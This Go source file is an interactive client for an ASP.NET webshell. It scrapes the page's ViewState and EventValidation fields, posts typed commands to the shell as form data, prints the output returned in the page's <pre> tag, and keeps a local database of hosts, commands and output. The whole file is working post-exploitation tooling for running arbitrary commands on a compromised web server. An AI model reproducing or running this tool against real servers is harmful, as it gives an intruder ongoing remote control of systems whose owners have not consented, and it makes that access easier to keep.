package main

import (
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path"
	"regexp"
	"strings"
	"time"

	"github.com/boltdb/bolt"
	"github.com/chzyer/readline"
	"github.com/jedib0t/go-pretty/v6/table"
	"github.com/jedib0t/go-pretty/v6/text"
	"golang.org/x/net/html"
)

const (
	prompt = "> "
)

var (
	regexes = map[string]*regexp.Regexp{
		"__VIEWSTATE":          regexp.MustCompile(`id="__VIEWSTATE" value="(.*?)"`),
		"__EVENTVALIDATION":    regexp.MustCompile(`id="__EVENTVALIDATION" value="(.*?)"`),
		"__VIEWSTATEGENERATOR": regexp.MustCompile(`id="__VIEWSTATEGENERATOR" value="(.*?)"`),
	}
	bucket = []byte(`commands`)
)

func main() {
	timeout := flag.Int("t", 5, "timeout for server")
	shellUrl := flag.String("u", "", "url for the webshell")
	list := flag.Bool("l", false, "list the history")
	flag.Parse()

	dir, err := getHomeDir()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not get home dir: %+v\n", err)
		os.Exit(1)
	}

	path := path.Join(dir, ".gosheller.db")

	db, err := getDB(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not initialize database: %+v\n", err)
		os.Exit(1)
	}

	if *list {
		items, err := db.getHistory()
		if err != nil {
			fmt.Fprintf(os.Stderr, "Could not get the command history: %+v\n", err)
			os.Exit(1)
		}
		renderTable(items)
		return
	}

	client := &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
	}

	// Fetch values of hidden fields
	resp, err := client.Get(*shellUrl)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error ocurred: %+v\n", err)
		os.Exit(1)
	}

	body, _ := ioutil.ReadAll(resp.Body)

	values := url.Values{}
	values.Add("testing", "excute")
	for key, re := range regexes {
		m := re.FindStringSubmatch(string(body))
		values.Add(key, m[1])
	}

	resp.Body.Close()

	rl, err := readline.New(prompt)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error creating readline: %+v\n", err)
		os.Exit(1)
	}
	defer rl.Close()

	// Start reading loop and sending data
	for {
		fmt.Print(prompt)
		command, err := rl.Readline()
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error reading command: %+v\n", err)
			os.Exit(1)
		}

		if command == "exit" {
			fmt.Println("Exiting")
			os.Exit(1)
		}

		values.Set("txtArg", strings.TrimSpace(command))
		output, err := executeCommand(client, *shellUrl, values)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error executing command: %+v\n", err)
			os.Exit(1)
		}

		item := &Item{
			Host:    *shellUrl,
			Command: command,
			Output:  output,
			Time:    time.Now(),
		}

		if err := db.saveCommand(item); err != nil {
			fmt.Fprintf(os.Stderr, "Error saving the command in the history: %+v\n", err)
		}

		fmt.Print(output)
	}
}

func executeCommand(client *http.Client, shellUrl string, values url.Values) (string, error) {
	resp, err := client.PostForm(shellUrl, values)
	if err != nil {
		return "", nil
	}
	defer resp.Body.Close()

	z := html.NewTokenizer(resp.Body)

	var output string

	for {
		tt := z.Next()

		switch tt {
		case html.ErrorToken:
			return output, nil
		case html.StartTagToken:
			t := z.Token()

			switch t.Data {
			case "pre":
				z.Next()
				t = z.Token()
				output = t.Data
			}
		}
	}
}

type Item struct {
	Host    string
	Command string
	Output  string
	Time    time.Time
}

type DB struct {
	db *bolt.DB
}

func getDB(path string) (*DB, error) {
	db, err := bolt.Open(path, 0600, &bolt.Options{Timeout: 5 * time.Second})
	if err != nil {
		return nil, err
	}
	return &DB{db: db}, db.Update(func(tx *bolt.Tx) error {
		_, err := tx.CreateBucketIfNotExists(bucket)
		return err
	})
}

func (d *DB) saveCommand(item *Item) error {
	return d.db.Update(func(tx *bolt.Tx) error {
		b := tx.Bucket(bucket)
		id, _ := b.NextSequence()

		encoded, err := json.Marshal(item)
		if err != nil {
			return err
		}

		return b.Put(itob(int(id)), encoded)
	})
}

func itob(v int) []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint64(b, uint64(v))
	return b
}

func (d *DB) getHistory() ([]Item, error) {
	var items []Item
	err := d.db.View(func(tx *bolt.Tx) error {
		b := tx.Bucket(bucket)
		c := b.Cursor()

		for k, v := c.First(); k != nil; k, v = c.Next() {
			var item Item
			err := json.Unmarshal(v, &item)
			if err != nil {
				return err
			}
			items = append(items, item)
		}
		return nil
	})
	return items, err
}

func renderTable(items []Item) {
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.AppendHeader(table.Row{"Time", "Host", "Command", "Output"})

	for _, item := range items {
		t.AppendRow(table.Row{item.Time, item.Host, item.Command, item.Output})
	}

	title := "Command history"
	t.SetTitle(title)
	t.Style().Title.Align = text.AlignCenter
	t.Render()
}

func getHomeDir() (string, error) {
	dir, err := os.UserHomeDir()
	return dir, err
}
